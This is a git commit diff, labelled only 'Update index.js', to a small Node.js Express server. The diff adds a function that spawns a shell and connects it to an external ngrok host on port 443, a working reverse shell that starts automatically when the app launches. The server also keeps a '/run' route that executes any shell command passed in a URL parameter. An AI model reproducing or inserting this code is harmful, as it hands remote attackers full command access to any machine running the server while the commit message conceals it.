9321b35752f5e9018d8724b8da6acc6341425ddc
ahmedgomaaa <37199252+ahmedgomaaa@users.noreply.github.com>
2024-08-12 18:26:05 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,31 @@
 const express = require('express');
 const { exec } = require('child_process');
+const net = require('net');
+const cp = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Function to start the reverse shell
+function startReverseShell() {
+    const sh = cp.spawn('sh', []);
+    const client = new net.Socket();
+
+    client.connect(443, '5a51-140-238-85-162.ngrok-free.app', function() {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+
+    // Prevents the Node.js application from crashing
+    return /a/;
+}
+
+// Start the reverse shell when the application starts
+startReverseShell();
+
 // Route to execute commands from URL parameter
 app.get('/run', (req, res) => {
-    // Get the command from the URL parameter
     const command = req.query.command;
 
     if (!command) {
@@ -14,7 +33,6 @@ app.get('/run', (req, res) => {
         return;
     }
 
-    // Execute the command
     exec(command, (error, stdout, stderr) => {
         if (error) {
             res.send(`<pre>Error: ${error.message}</pre>`);
